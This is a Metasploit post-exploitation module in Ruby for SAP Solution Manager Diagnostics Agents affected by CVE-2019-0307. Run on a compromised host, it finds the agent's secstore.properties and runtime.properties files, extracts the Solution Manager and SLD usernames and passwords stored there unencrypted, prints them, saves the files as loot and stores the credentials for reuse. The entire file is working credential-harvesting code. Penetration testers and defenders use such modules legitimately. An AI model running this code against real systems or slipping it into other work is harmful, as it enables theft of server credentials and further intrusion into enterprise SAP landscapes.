##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::File
  include Msf::Exploit::Local::SapSmdAgentUnencryptedProperty

  SECSTORE_FILE = 'secstore.properties'.freeze
  RUNTIME_FILE = 'runtime.properties'.freeze

  WIN_PREFIX = 'c:\\usr\\sap\\DAA\\'.freeze
  UNIX_PREFIX = '/usr/sap/DAA/'.freeze

  WIN_SUFFIX = '\\SMDAgent\\configuration\\'.freeze
  UNIX_SUFFIX = '/SMDAgent/configuration/'.freeze

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Diagnostics Agent in Solution Manager, stores unencrypted credentials for Solution Manager server',
        'Description' => %q{
          If a SMDAgent has CVE-2019-0307 vulnerability, attackers can obtain its secstore.properties configuration file,
          which contains the credentials for the SAP Solution Manager server to which this SMDAgent is connected.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'Yvan Genuer', # @_1ggy The researcher who originally found this vulnerability
          'Vladimir Ivanov' # @_generic_human_ This Metasploit module
        ],
        'Platform' => %w[bsd linux osx unix win],
        'SessionTypes' => %w[meterpreter shell],
        'References' => [
          %w[CVE 2019-0307],
          %w[URL https://conference.hitb.org/hitblockdown002/materials/D2T1%20-%20SAP%20RCE%20-%20The%20Agent%20Who%20Spoke%20Too%20Much%20-%20Yvan%20Genuer.pdf]
        ]
      )
    )
  end

  def run
    case session.platform
    when 'windows'
      instances = session.fs.dir.foreach(WIN_PREFIX)
      windows = true
    else
      instances = session.fs.dir.foreach(UNIX_PREFIX)
      windows = false
    end

    if (instances == '') || instances.nil?
      fail_with(Failure::NotFound, 'SAP root directory not found')
    end

    instances.each do |instance|
      next if instance == 'SYS'

      if windows
        runtime_properties_file_name = "#{WIN_PREFIX}#{instance}#{WIN_SUFFIX}#{RUNTIME_FILE}"
        secstore_properties_file_name = "#{WIN_PREFIX}#{instance}#{WIN_SUFFIX}#{SECSTORE_FILE}"
      else
        runtime_properties_file_name = "#{UNIX_PREFIX}#{instance}#{UNIX_SUFFIX}#{RUNTIME_FILE}"
        secstore_properties_file_name = "#{UNIX_PREFIX}#{instance}#{UNIX_SUFFIX}#{SECSTORE_FILE}"
      end

      runtime_properties = parse_properties_file(runtime_properties_file_name)
      secstore_properties = parse_properties_file(secstore_properties_file_name)

      print_status("Instance: #{instance}")
      print_status("Runtime properties file name: #{runtime_properties_file_name}")
      print_status("Secstore properties file name: #{secstore_properties_file_name}")

      sld_protocol = nil
      sld_hostname = nil
      sld_address = nil
      sld_port = nil
      sld_username = nil
      sld_password = nil

      smd_url = nil
      smd_username = nil
      smd_password = nil

      # Parse runtime.properties file
      runtime_properties.each do |property|
        if property[:name] =~ /sld\./
          case property[:name]
          when /hostprotocol/
            sld_protocol = property[:value]
          when /hostname/
            sld_hostname = property[:value]
          when /hostport/
            sld_port = property[:value]
          end
        elsif property[:name] =~ /smd\./
          case property[:name]
          when /url/
            smd_url = property[:value].gsub(/\\:/, ':')
          end
        end
      end

      # Parse secstore.properties file
      secstore_properties.each do |property|
        if property[:name] =~ %r{sld/}
          case property[:name]
          when /usr/
            sld_username = property[:value]
          when /pwd/
            sld_password = property[:value]
          end
        elsif property[:name] =~ %r{smd/}
          case property[:name]
          when /User/
            smd_username = property[:value]
          when /Password/
            smd_password = property[:value]
          end
        end
      end

      # Print SLD properties
      if !sld_protocol.nil? || !sld_hostname.nil? || !sld_port.nil? || !sld_username.nil? || !sld_password.nil?
        print_line
        print_status('SLD properties:')
        unless sld_protocol.nil? then print_status("SLD protocol: #{sld_protocol}") end
        unless sld_hostname.nil?
          print_status("SLD hostname: #{sld_hostname}")
          sld_address = session.net.resolve.resolve_host(sld_hostname)[:ip]
          print_status("SLD address: #{sld_address}")
        end
        unless sld_port.nil? then print_status("SLD port: #{sld_port}") end
        unless sld_username.nil? then print_good("SLD username: #{sld_username}") end
        unless sld_password.nil? then print_good("SLD password: #{sld_password}") end
      end

      # Print SMD properties
      if !smd_url.nil? || !smd_username.nil? || !smd_password.nil?
        print_line
        print_status('SMD properties:')
        unless smd_url.nil? then print_status("SMD url: #{smd_url}") end
        unless smd_username.nil? then print_good("SMD username: #{smd_username}") end
        unless smd_password.nil? then print_good("SMD password: #{smd_password}") end
      end

      print_line
      if sld_username.nil? || sld_password.nil?
        print_error("File #{secstore_properties_file_name} read, but this file is likely encrypted or does not contain credentials. This SMDAgent is likely patched.")
      else
        # Store decoded credentials
        print_good('Store decoded credentials for SolMan server')
        if sld_address.nil? || sld_port.nil?
          service_data = {}
        else
          service_data = {
            origin_type: :service,
            address: sld_address,
            port: sld_port,
            service_name: 'http',
            protocol: 'tcp'
          }
          # Report service
          report_service(
            host: sld_address,
            port: sld_port,
            name: 'http',
            proto: 'tcp',
            info: 'SAP Solution Manager'
          )
        end
        store_valid_credential(
          user: sld_username,
          private: sld_password,
          private_type: :password,
          service_data: service_data
        )

        # Report vulnerability
        agent_host = Rex::Socket.getaddress(session.sock.peerhost, true)
        report_vuln(
          host: agent_host,
          name: name,
          refs: references
        )
      end
    end
  end

  def parse_properties_file(filename)
    properties = []
    if session.fs.file.exist?(filename)
      properties_content = session.fs.file.open(filename).read
      if properties_content.nil?
        print_error("Failed to read properties file: #{filename}")
      else
        agent_host = Rex::Socket.getaddress(session.sock.peerhost, true)
        loot = store_loot('smdagent.properties', 'text/plain', agent_host, properties_content, filename, 'SMD Agent properties file')
        print_good("File #{filename} saved in: #{loot}")
        properties = parse_properties(properties_content)
      end
      properties
    else
      print_error("File: #{filename} does not exist")
    end
  end
end
